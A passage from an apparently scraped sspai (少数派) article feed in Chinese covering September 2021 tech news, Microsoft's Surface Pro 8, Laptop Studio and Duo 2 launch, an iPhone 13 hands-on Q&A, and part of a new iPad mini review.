Civi 系列手机。Civi 是小米手机旗下的全新产品线，主打潮流设计和影像体验，主要面向年轻用户群体。<a href=\"https://weibo.com/1678020401/KzjBMma92?from=page_1005051678020401_profile&amp;wvr=6&amp;mod=weibotime&amp;type=comment#_rnd1632282961760\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/23/article/35857c5d995962bfe5b966ee82cdc363\"><figcaption>图片来自小米</figcaption></figure><h3>Redmi 发布 2021 款 G 系列游戏本</h3>\n<p>9 月 22 日，Redmi 发布了 2021 款 G 系列游戏笔记本电脑。该系列配备 16.1 英寸的 144 Hz 电竞屏，拥有「飓风散热 3.0」及独显直连等特性，分为英特尔版和锐龙版两款，显卡最高可选 RTX 3060，CPU 最高可选 AMD 锐龙 7 5800H。</p>\n<p>Redmi G 2021 英特尔版定价 5699 元，锐龙版定价 6999 元，电商渠道目前已开启预售。<a href=\"https://weibo.com/5977021843/KzjA2AkLQ?from=page_1006065977021843_profile&amp;wvr=6&amp;mod=weibotime&amp;type=comment#_rnd1632283584276\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/23/article/f18a607b3e52f8718f4c029fd4ed7538\"><figcaption>Redmi G 2021 锐龙版配置表，图片来自小米笔记本</figcaption></figure><h3>一加确认本年度不会推出 T 系列手机</h3>\n<p>近日，一加公司创始人刘作虎在接受采访时表示，一加今年将不会推出 T 系列产品，这是一加自 3T 以来首次没有在当年推出 T 系列手机。<a href=\"https://www.cnbeta.com/articles/tech/1181289.htm\" target=\"_blank\">来源</a></p>\n<h3>花呗公布接入征信工作进展</h3>\n<p>花呗于 9 月 22 日公布了最新的接入征信工作的进展情况，情况公告显示，在央行征信管理部门的指导下，花呗正逐步推进接入央行征信系统的工作，目前在获得用户授权的基础上，部分用户已经能够在自己的征信报告中查询到花呗记录，未来征信服务将逐步覆盖全部用户。目前花呗用户收到的征信授权协议和公告内容均显示，根据用户获得的具体授信额度来源，用户的征信信息会由重庆蚂蚁消费金融有限公司，或是提供授信额度的银行等机构作为报送主体，纳入征信系统。<a href=\"https://www.tmtpost.com/nictation/5706725.html\" target=\"_blank\">来源</a></p>\n<h3>《尚气与十环传奇》确认登陆 Disney+</h3>\n<p>《尚气与十环传奇》片方确认，该片将于 11 月 12 日登陆流媒体服务 Disney+。《尚气》目前仍在院线上映，全球票房累计 3.07 亿美元。<a href=\"https://weibo.com/1769684987/KzjUXqQh2?ref=home&amp;rid=5_0_8_6667887386495837130_6_0_0&amp;type=comment#_rnd1632304643278\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/23/article/47b9e9461f7f41be05870b00e600d85e\"><figcaption>影片海报，图片来自新闻源</figcaption></figure><h2>看看就行的小道消息</h2>\n<ul>\n<li>据知情人士称，欧盟委员会将会在 9 月 23 日提出一项议案，希望通过立法的形式让手机、平板、耳机可以使用通用充电器，如果立法成功将会对 Apple 产生较大影响，此前欧盟立法统一了绝大多数的电子设备的充电器标准，其采用的是 Micro USB 接口，由于目前大部分 Android 手机都采用 USB-C，统一后接口标准或许将采用目前的事实标准。<a href=\"https://tech.ifeng.com/c/89jxLnbbZkn\" target=\"_blank\">来源</a>\n</li>\n<li>据最新信息显示，苹果在近期发布的 iOS 15.1 Beta 版本里引入了 COVID 疫苗接种信息卡的功能，部分地区的用户可以在钱包中快速打卡接种卡，便于生活出行。<a href=\"https://www.macrumors.com/2021/09/21/ios-15-vaccine-card-wallet-app/\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>📖 Apple 发布会上没有「One More Thing」？我们给你备上了：《少数派系统指南 · iOS 15》上架预购<strong>八折</strong>优惠中，更多介绍请前往 <a href=\"https://sspai.com/series/228\" target=\"_blank\">栏目页面</a> 查看。</li>\n<li>🦦 少数派「监工水獭」挂灯摆件 <a href=\"https://item.taobao.com/item.htm?id=656156847801\" target=\"_blank\">正式上架</a>，上新特惠 ￥49（原价 ￥69）。</li>\n<li>🎁 少数派会员增刊<a href=\"https://sspai.com/prime/precog/sp-0x00\" target=\"_blank\">《科技漫游》第〇期已经发布</a>，会员群、知识库同期上线，<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=641648482116\" target=\"_blank\">现在购买</a> 可获赠价值 40 元的白描黄金版。</li>\n<li>🎉 少数派正版软件商城 <a href=\"https://sspai.com/mall/discount/%E5%BC%80%E5%AD%A6%E5%AD%A3%E4%BF%83%E9%94%80\" target=\"_blank\">开学季促销</a> 继续进行中，数十款优质软件低至 5 折起。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>，Kindle 商店电子书版也已上架。</li>\n</ul>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li>📱 <a href=\"https://sspai.com/post/68922\" target=\"_blank\">快问快答：iPhone 13 系列快速上手体验</a>\n</li>\n<li>🍎 <a href=\"https://sspai.com/post/68928\" target=\"_blank\">这也许是你会喜欢的那台「纯粹」的 iPad：全面屏 iPad mini 上手体验</a>\n</li>\n<li>📖 <a href=\"https://sspai.com/post/68915\" target=\"_blank\">限时福利｜比苹果官方用户手册更易读、更全面：少数派系统指南·iOS 15</a>\n</li>\n<li>🌛 <a href=\"https://sspai.com/post/68924\" target=\"_blank\">具透 | iOS 15 通知管理和专注模式详解</a>\n</li>\n<li>📷 <a href=\"https://sspai.com/post/68911\" target=\"_blank\">不想被回忆「补刀」，从调校相册推荐算法开始</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68932"},{"title":"Surface 迎来窄边框、高刷新率时代：微软 2021 年秋季硬件发布会汇总","date":"2021-09-23 00:00:00","description":"\n<p>北京时间 9 月 22 日晚，微软通过线上发布会为自家硬件设备带来了全面更新。从 Surface Pro 8、Surface Laptop Studio 到第二代搭载微软定制版 Android 操作系统的折叠屏设备 Surface Duo，相比去年同一时间的线上发布活动可谓多了不少看点。</p>\n<p>本文就来为你一一梳理。</p>\n<h2>Surface Pro 8</h2>\n<p>首代 Surface Pro 产品亮相 8 年之后，微软终于为我们带来了那款不少老用户期待已久的 Surface Pro 8。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55mtblb34te7d7m57ig.jpeg\"></figure><p>Surface Pro 8 搭载经过英特尔 Evo 平台认证的第 11 代四核处理器、英特尔锐炬 Xe 显卡、最高 32GB LPDDR4x RAM、1TB 可拆卸 SSD 存储，同时配备更加轻薄的键盘盖和新款 Surface Slim Pen 2；整机重量 889g，常规使用下续航时间为 16 小时。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55mtbtb34te72rr869g.jpeg\"></figure><p>最重要的是，手写笔能够像此前的 Surface Pro X 那样直接收纳进键盘里了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c55mtc5b34te72rr86a0.gif\"></figure><p>接口方面，Surface Pro 8 提供了 2 个支持雷电 4 协议的 USB 4.0 接口、1 个 3.5mm 耳机孔、1 个 Surface Connect 接口以及用于键盘连接的 Surface Type Cover 接口。</p>\n<p>除了相比前代产品而言更加轻薄的设计和让非 Surface Pro X 用户眼馋不已的触控笔收纳方式外，Surface Pro 8 也终于在屏幕上迈出了一大步：这块 13 英寸的 PixelSense™ Flow 屏幕不仅终于有了更窄的边框，屏幕刷新率也来到了最高 120Hz，并且支持杜比视界和环境色温显示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55mtclb34tdol81mo1g.png\"></figure><p>触控体验上，Surface Pro 8 所配备的新款触控笔搭载了微软自研的 G6 芯片，能够在使用过程中配合 Windows 同步提供细致的振动反馈体验，营造出更加真实的纸笔触感。这一点与 Windows 11 近期在触控方面的优化可谓相得益彰。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55mtd5b34tdol81mo20.png\"><figcaption>新款触控笔中的 G6 芯片能够提供振动反馈</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55mtddb34te7d7m57j0.png\"><figcaption>拿出触控笔时，Windows 11 也会弹出快速菜单</figcaption></figure><p>Surface Pro 8 售价 1099.99 美元起。</p>\n<h2>Surface Laptop Studio</h2>\n<p>发布会上的另一大重磅新品 Surface Laptop Studio 则带着「有史以来性能最强的 Surface」的称谓登场。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55mtdtb34te72rr86ag.png\"></figure><p>在微软首席产品官 Panos Panay 看来，Surface Laptop Studio 是一款融合了 Surface Book 和 Surface Studio 两大产品线理念的全新形态设备，它兼具桌面级 PC 的性能、笔记本设备的便携性以及更加适合数字创作的平板形态，借助采用编织线缆的动态折叠铰链（Dynamic Woven Hinge），Surface Laptop Studio 能够通过灵活改变屏幕角度和支撑点的方法来贴合不同的使用场景。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c55mtetb34te7d7m57jg.gif\"></figure><p>为了满足这种多形态使用需求，硬件配置方面 Surface Laptop Studio 自然也给得非常到位。屏幕方面配备了一块 14.4 英寸触控屏，和 Surface Pro 8 一样同样为最高 120Hz 刷新率的 PixelSense™ Flow 显示屏，分辨率为 2400×1600，支持杜比视界；机身接口包括 2 个支持雷电 4 的 USB 4.0 接口、1 个 3.5mm 耳机孔以及 1 个 Surface Connect 接口，最高提供 32GB LPDDR4x RAM、英特尔 11 代 H35 i7-11370H 处理器、2TB 可拆卸 SSD 存储以及英伟达 GeForce RTX™3050 Ti 显卡可选。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55mtfdb34tdol81mo2g.png\"></figure><p>Surface Laptop Studio 顶配版理论续航时间为 18 小时，机身重量 1.82KG，配备 95W 电源适配器；搭载英特尔锐炬 Xe 显卡、第 11 代 H35 i5-11300H 处理器的版本理论续航则是 19 小时，重 1.74KG，配备 60W 电源适配器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55mtflb34te72rr86b0.png\"></figure><p>值得一提的是，Surface Laptop Studio 不仅配备了可通过机身底部进行磁吸收纳和充电的新款 Surface Slim Pen 2，它同时也是首款在精准触控板中内置了振动马达的 Surface 产品，使用触摸板进行不同操作时能够获得对应的振动反馈。</p>\n<p>Surface Laptop Studio 售价 1599.99 美元起。</p>\n<h2>Surface Duo 2</h2>\n<p>去年似乎有些叫好不叫座、正式「谢幕」前价格更是疯狂跳水的 Surface Duo，昨晚也迎来了第二代。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55mtftb34tdol81mo30.png\"></figure><p>因为有了骁龙 888 的加持，Surface Duo 2 自然也成为了一款支持 5G 网络的手机；标志性的双屏折叠式设计继续发扬光大，其中左右两侧 PixelSense™ 显示屏均为 5.8 英寸、1344×1892 分辨率 AMOLED 材质屏幕，展开后则是一块名为 Dual PixelSense™ Fusion Displays 的 8.3 英寸屏幕，微软给出的分辨率为 2688×1892。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55mtftb34te7d7m57k0.jpeg\"></figure><p>没错，从官方的屏幕参数表述上其实就不难看出，今年 Surface Duo 2 虽然依然是左右双屏折叠的形态，但展开状态下的交互和体验上似乎都更加强调大屏的整体性；为此微软也为 Surface Duo 2 准备了数量相当可观的首发适配应用阵容，包括 Kindle、Teams、Disney+、Outlook、TikTok、Edge 浏览器等等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55mtg5b34te7d7m57kg.png\"><figcaption>这种狂野飙车体验应该是独一份的</figcaption></figure><p>相机从参数上来看也有不小的提升，采用了由 1200 万像素广角主摄、1200 像素 2x 长焦和 1600 万像素 110° 超广角副摄组成的后置三摄方案。最有意思的地方在于，Surface Duo 2 还在转轴处配备了一个长条形的提示灯条，用于展示来电、通知、音量、电量水平等信息，算是解决了「合上的设备没有 AOD」这一问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55mtgdb34tdookl6em0.gif\"></figure><p>其他配置方面，Surface Duo 2 配备了 8GB RAM、最高 512G 存储空间和 4449mAh 容量电池，整机重量 284g，售价 1499.99 美元起，10 月 21 日正式开售。</p>\n<h2>Surface Pro X 2021</h2>\n<p>虽然在本次发布会上微软只是寥寥几句带过，但这款基于 ARM 处理器的 Surface 桌面产品还是迎来了一次小升级，处理器沿用了微软和高通联手打造的 SQ1/SQ2，支持最高 512GB 的可拆卸 SSD，但额外增加了两种连接选项：千兆 LTE 和仅 Wi-Fi 连接。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/23/article/a7578f3956acc2c531193888fe744ae0\"></figure><p>其它更新内容则主要集中在软件体验上，首先微软承诺将会支持 ARM 平台的 x86/x64 的应用仿真，并且将会专门为 Windows on ARM 平台打造 64 位 Office 应用；游戏玩家则可以通过 Xbox Game Pass Ultimate 订阅服务享受到云游戏体验，并且同时获得一个月的低价福利。</p>\n<p>Surface Pro X 2021 在售价上也有所调整，入门款价格调整到了 899 美元。</p>\n<h2>Surface Go 3</h2>\n<p>作为实际发布顺序紧跟 Surface Pro 8 的「小兄弟」，Surface Go 3 在外观设计上倒是没有 Pro 系列那样大的变化。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55mtglb34tdookl6emg.png\"></figure><p>得益于英特尔奔腾金牌 6500Y 双核处理器和第 10 代酷睿 i3-10100Y 四核处理器，Surface Go 3 的运行速度据称提高了 60%；其他配置包括 10.5 英寸、1920×1280 分辨率 PixelSense™ 显示屏、最高 8GB LPDDR3 RAM、64GB eMMC/128GB SSD 存储以及英特尔 UHD 615 显卡。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55mthdb34tdol81mo3g.jpeg\"></figure><p>Surface Go 3 重 544g，售价 399.99 美元起。有意思的是，微软在发布 Surface Go 3、宣传其家庭教育和娱乐使用场景的同时，也顺带发布了一款外壳采用 20% 海洋回收塑料材质的 Ocean Plastic 鼠标，支持蓝牙 5.0 连接和最高 12 个月电池续航时间，观感非常清新，售价 24.99 美元；</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55mthlb34te72rr86bg.png\"></figure><p>以及一套面向残障人士的无障碍工具（Accessibility Kit），这套工具可用于标记键盘按键、电源线等，方便残障用户更加快速、轻松地使用电子产品。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c55mthtb34te7d7m57l0.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c55mtidb34tdol81mo40.png\" alt=\"\"></figure><h2>小结</h2>\n<p>以上便是本次微软秋季硬件发布会上值得关注的主要新品。大家对新款 Surface Pro 8 的升级还满意吗，又是如何看待 Surface Laptop Studio 这位「新成员」的？欢迎在评论区分享你的想法。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68931"},{"title":"快问快答：iPhone 13 系列快速上手体验","date":"2021-09-22 13:01:00","description":"\n<p> </p>\n<p>远峰蓝、ProMotion 高刷屏、微距摄影、电影效果…… 今年的 4 款新 iPhone 从外观到硬件再到功能都有不少变化，对于大家比较关心的重量、配色、新功能等问题，我们在获得了短暂体验 iPhone 13 系列机型的机会之后，也进行了整理，通过这篇文章和你分享一下。</p>\n<h2>iPhone 13 重不重？</h2>\n<p>重。</p>\n<p>根据 Apple 官网给出的信息可以看出，iPhone 13 全系列机型都比去年对应的 4 款机型更重。其中，iPhone 13 和 iPhone 13 mini 分别比前代产品重了 7 克和 11 克，iPhone 13 Pro 和 iPhone 13 Pro Max 分别比前代产品重了 16 克和 12 克。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c524dntb34tf23l9usv0.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>由于 iPhone 13 Pro 系列机型的重量本身就已重于 iPhone 13 系列机型不少，重量的增加在 Pro 机型上的感知更为明显，2 款设备拿在手上明显感觉更沉了。不过，对于重量的感知和容忍程度因人而已，这本来也不是大多数人选购 iPhone 考虑的首要因素，该买哪款机型还是根据需求下单即可，不必过分担心。</p>\n<p>如果对于重量的感知比较敏感，建议还是等待新款 iPhone 正式发售之后，前往 Apple Store 实机感受真机之后进行决定。尤其是 iPhone 13 Pro Max 达到了 238 克，如果加上保护壳，重量快赶上 iPad mini 了。</p>\n<h2>「远峰蓝」是什么蓝？</h2>\n<p>iPhone 的 Pro 系列机型每年都会推出新的配色，今年也不例外。随着全新的「远峰蓝」配色 iPhone 在发布会上揭晓，它也立即成为 iPhone 13 Pro 系列中最受关注的机型。</p>\n<p>不过，如果只是观察官网给出的展示图片，对于配色的感知其实并不直观，这也让不少人在选购新款 iPhone 时犹豫不决。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/22/8f49702b47957ccaf818bf4c96a3cd76.jpg\"><figcaption>不同光线角度之下会有不同观感</figcaption></figure><p>从我的观察来说，「远峰蓝」在光线明亮的环境下呈现的是一种淡蓝的色彩，在不同的光线角度和条件下会有些许变化，总体来说比较耐看。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/22/e9b60e90b7fb90a76c3ad369046837a1.jpg\"><figcaption>「远峰蓝」iPhone 13 Pro</figcaption></figure><p>说到配色，还想再谈谈 iPhone 13 系列机型全新推出的「午夜色」。不论是从官网展示的图片、还是现场体验来看，我一直以为「午夜色」实际上就是黑色，直到在明亮的灯光下我才发现，「午夜色」实际上是一种观感极为接近黑色的深蓝色。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/22/476d760afa2bb565b52505dc9df9ac24.jpg\"><figcaption>「午夜色」iPhone 13</figcaption></figure><p>可以说，在大部分场景下，你都会觉得这就是一款黑色的 iPhone，只有经过仔细观察，你才会发现「藏在背后」的蓝色。</p>\n<h2>「刘海」变小了？</h2>\n<p>Apple 在发布会上称 iPhone 13 系列机型的原深感前置摄像头区域即「刘海」面积缩小 20%，实际观察来看，「刘海」在横向区域上确实能够明显看出变得更「短」了，但是仔细观察也能发现「刘海」确实变得更「高」了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/22/a63cd1015afd852345bb26e8f31288b4.jpg\"><figcaption>扬声器被往上移了</figcaption></figure><p>究其原因，iPhone 13 系列将听筒位置进行了上移，高出的部分应该是为了给扬声器腾出空间。至于设计方面变化的好坏，全凭个人喜好因人而异，这里不做展开讨论。</p>\n<h2>摄像头大不大？</h2>\n<p>iPhone 13 Pro 的后置摄像头模组相较于 iPhone 12 Pro，可以说大了，也可以说「没大」。</p>\n<p>大了是指 iPhone 13 Pro 系列相比前代机型，摄像头模组的面积变得更大，将 2 代机型放在一起直接进行比较，一眼就能看得出来。</p>\n<p>「没大」则指在没有对比的情况下，你对于拿在手上的 iPhone 摄像头变得更大了这件事实际上不会有明显感知，不必过分纠结于此。不过，将 iPhone 13 Pro 系列机型放在水平桌面上时，「放不平」的感觉还是明显强于 iPhone 12 Pro 系列机型。</p>\n<h2>「高刷屏」感知明显吗？</h2>\n<p>iPhone 13 Pro 系列机型首次支持了 120Hz ProMotion 自适应刷新率技术，刷新频率可在每秒 10 次到 120 次之间自由调整。比如，当浏览屏幕内容静止不动时，屏幕会自动切换至低刷新率运行，当滑动屏幕查看内容或者玩游戏时，屏幕又会动态调整至高刷新率运行，最高可达 120Hz。</p>\n<p>实际体验下来，ProMotion 对于 iPhone 的体验提升感知比较明显，在 Safari、App Store 等 App 中滑动浏览时能够明显感到更加「顺滑」，页面滑动速度也会更快。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/22/7524720ce28aea37c34cd1a4d26728a6.gif\"><figcaption>右为 iPhone 13 Pro，可以看出滑动速度稍快，滑动时残影更少。</figcaption></figure><p>不过，在体验适配了 ProMotion 技术的 <a href=\"https://catalystblack.com/?lang=zh-hans\">Catalyst Black</a> 这款游戏的测试版本时，我却没有比较明显的感知。由于体验时间短、并且没能在 iPhone 12 Pro 上体验这款游戏作为对比，ProMotion 技术在游戏方面的体验仅供参考。iPhone 13 Pro 系列正式发售之后，我们也会继续测试 ProMotion 技术在游戏方面的表现，带来更加深度的体验内容。</p>\n<h2>「微距摄影」好不好用？</h2>\n<p>「微距摄影」是 iPhone 13 Pro 系列专享的新功能，利用超广角摄像头，iPhone 能够清晰拍摄最近距离 2 厘米的物体细节。</p>\n<p>实际体验下来，这项功能的易用性和实用性还是相当高的，不像「电影效果」需要专门选择对应的拍摄模式进行切换，只需要将 iPhone 靠近物品，「微距摄影」模式就会自动启用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/22/b3cc9b297a331acc3daf84b1ebe615b8.jpg\"><figcaption>微距摄影</figcaption></figure><p>需要一提的是，将 iPhone 靠近物体使用「微距摄影」拍摄时，靠近过程会有一个明显的镜头切换效果，不过对于拍摄来说没有任何影响。对了，如果你想在拍摄视频时进行微距摄影，也完全没有问题。</p>\n<h2>「电影效果」呢？</h2>\n<p>「电影效果」是 iPhone 13 全系列机型都支持的一项新功能，它能自动判断画面中的主体人物或者物体，自动转换焦点，实现类似电影作品的叙事风格。</p>\n<p>虽然可以「粗暴」地将「电影效果」当作一种视频人像模式，但拍摄时 iPhone 绝不仅仅只是做了「虚化背景」这一件事这么简单。体验过程中，「电影效果」能够准确地识别画面中的前后景关系，比如当人物作为画面主体时，人物面前即前景中的水杯以及背景都能准确进行虚化。</p>\n<p>其它方面，「电影效果」支持在拍摄时手动调整焦点，拍摄完毕之后也能通过后期编辑重新选择画面焦点，虽然仅能拍摄 1080p、30 fps 规格的视频，对于日常使用场景而言已经足够用了。</p>\n<p>你对于 iPhone 13 系列还有哪些疑问和想法？欢迎在评论区和我们分享讨论。我们也会在之后带来 iPhone 13 系列新品的深度体验内容，敬请期待。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68922"},{"title":"这也许是你会喜欢的那台「纯粹」的 iPad：全面屏 iPad mini 上手体验","date":"2021-09-22 13:00:00","description":"\n<p>对于 iPad 系列而言，iPad mini 是个特殊的存在：轻薄、小尺寸、主打便携性。在平板电脑产品不断「桌面化」的今天，反其道而行之的 iPad mini 却依然能占据一席之地，成为不少人最喜欢的那台 iPad。</p>\n<p>时隔 2 年多，iPad mini 终于迎来了第六代产品：A15 仿生芯片、Liquid 视网膜全面屏、支持第二代 Apple Pencil…… 这些看似意料之中却又令人惊喜的升级，让不少人对这台全新的 iPad mini 充满了期待。</p>\n<p>那么，这台全新的 iPad mini 到底表现如何，它是否才是你需要的那台更为「纯粹」的 iPad？实际上手体验之后，不妨跟着我们一起尝试解答你心中的这些疑惑。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/22/efc422cc2aed4c640f3964fe6ea54216.jpg\"></figure><h2>一台怎么拿都舒服的 iPad</h2>\n<p>全面屏是今年 iPad mini 的一项重要升级，这不仅意味着 iPad 产品设计风格的进一步统一，也让这款产品在继续维持小尺寸设计的基础上，拿得更舒服、变得更好「看」了。</p>\n<p>得益于全面屏设计，新款 iPad mini 在屏幕变大之后，设备尺寸反而变得更小：第六代 iPad mini 的高度和宽度分别为 195.4 毫米和 134.8 毫米，第五代 iPad mini 则为 203.2 毫米和 134.8 毫米；为了让它能够「装」上第二代 Apple Pencil，厚度又略有增加。对了，300 克不到 (297 克) 的重量，相比前代产品也降低了 10 克左右。</p>\n<p>因此，iPad mini 依然会是一台怎么拿都舒服的 iPad。拿着 iPad Pro，你可能会担心它「砸」在脸上；拿着 iPhone，你可能会觉得屏幕太小。这个时候，这台 iPad mini 就显得恰到好处。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/22/ab349eacc82a5c1e53708e5a711dbd48.jpg\"></figure><p>iPad mini 也是形态最多的 iPad：有了智能双面夹，可以立着看、「躺」着看，也可以翻过来，轻松拿在手上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/22/824fb34290ad048512f9bee1550f38e3.jpg\"></figure><h2>一台「好看好玩」的 iPad</h2>\n<p>再来看看这块全面屏的参数：Liquid 视网膜屏、P3 广色域、原彩显示。即使与 11 英寸 iPad Pro 比较，这块屏幕也仅仅是在最高亮度方面略处下风 (低了 100 尼特)。可以说，iPad mini 在显示效果方面而言，面对「前辈」时也可以说是毫不露怯。</p>\n<p>你可能还忽略了一点，得益于小尺寸与高分辨率的组合，iPad mini 实际上有着所有 iPad 中最精细的显示效果 (326 ppi)。</p>\n<p>但是，不可忽略的是，这台 iPad mini 没有支持 ProMotion 自适应刷新率技术，虽然根据价位来看，Apple 的做法无可厚非，与高端机型拉开差距，产品定位更加明确。不过，如果已经习惯了 120Hz 刷新率带来的「顺滑」体验，刚接触这台 iPad mini 获得的一定会是「不习惯」，这块屏幕甚至可能还会给你有点「卡顿」的错觉。因此，对于 iPad Pro 用户而言，如果打算再买一台 iPad mini，需要做好屏幕之间不同体验带来的「割裂感」。</p>\n<p>当然，对于大多数人而言，这是一款显示效果达到第一梯队水准的屏幕，它能带给你的，是足够好的影音和阅读体验，也是你在这个价位区间之内能够选择的最佳产品。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/22/0bf3c332bb45267cf580caac2db46004.jpg\"></figure><p>接下来，再通过配置和功能，看看 iPad mini 的定位。</p>\n<p>如果说新款 iPad mini 除了外观还有什么让人不能忽视的升级，A15 仿生芯片一定是下一位：与 iPhone 13 Pro 系列同样规格的芯片，甚至比 iPhone 13 系列更强 (5 核 GPU)，这样的配置让 iPad mini 一跃成为 iPad 系列除了 M1 芯片之外的最强算力。</p>\n<p>当然，根据近期传出的 Geekbench 跑分数据来看，iPad mini 的单核跑分相较 iPhone 13 Pro 系列可能低了不少，Apple 似乎也认为 iPad mini 根本用不到这么强的算力。结合存储容量、计算摄影等等方面的差别，iPad mini 本质上就是一款娱乐与内容消费设备。</p>\n<p>还有一点需要注意，新款 iPad mini 的屏幕采用了 2266 x 1488 像素的分辨率，比例接近 1.52:1，是一个全新的画面比例。因此，许多 App 在这台 iPad mini 上运行时，两侧会存在明显黑边，这个问题需要等待开发者为 App 进行适配之后才能解决了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/22/6d238337733159872bdcd567cd9150aa.jpg\"><figcaption>未适配 App 会在双侧留下黑边</figcaption></figure><p>实际使用下来，iPad mini 在玩《原神》《狂野飙车 9》《和平精英》这类对于配置要求较高的游戏时，即使在高画质时依然有流畅表现，仅在镜头快速移动、或者画面复杂的场景中存在轻微卡顿现象。当然，这些游戏实际上还没有针对新的设备进行适配，没有太多说服力。</p>\n<p>于是，我又找了一款还在测试中的足球类型游戏《最佳球会》，这款游戏虽然还在测试阶段，但是已经针对新款 iPad mini 进行了适配。游玩过程开启最高画质，球员和画面清晰锐利，人物移动自然流畅，操作响应也足够灵敏和「顺滑」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/22/49bcc729c95128e0e90d6e50463a07d4.jpg\"><figcaption>《最佳球会》</figcaption></figure><p>如果你想用 iPad mini 玩游戏，唯一需要考虑的，可能是如何习惯手机和平板电脑之间游戏操作体验的不同。由于手机和平板电脑之间尺寸的差别，游戏键位距离、操作需要的手指移动幅度等等都会不同。如果你用任意一款 iPad 玩过游戏，就会知道我在说什么。</p>\n<p>可以预见，等到之后有更多游戏厂商为游戏作品进行适配之后，这台 iPad mini 说不定能够成为你的家庭最佳便携式游戏设备之一。毕竟，更加依赖手柄带来优秀游戏体验的 iPad Pro，家用主机其实更像竞争对手；至于屏幕比 iPhone 更大、便携性又远比其它 iPad 出色的 iPad mini，优势自然不言而喻。自然，iPad mini 也不用担心来自 Nintendo Switch 这类掌机产品的竞争，在我看来，平台差异决定了他们本质上就是不同类型、不同方向的游戏设备，如果你爱玩游戏，它们说不定能成为很好的互补。</p>\n<p>至于绘画、视频剪辑等等专业使用场景，相信不会有多少人完全依赖这样一台小尺寸、没有键盘的设备完成这些工作；用于应付日常轻量的相关需求或者不时之需，配备 A15 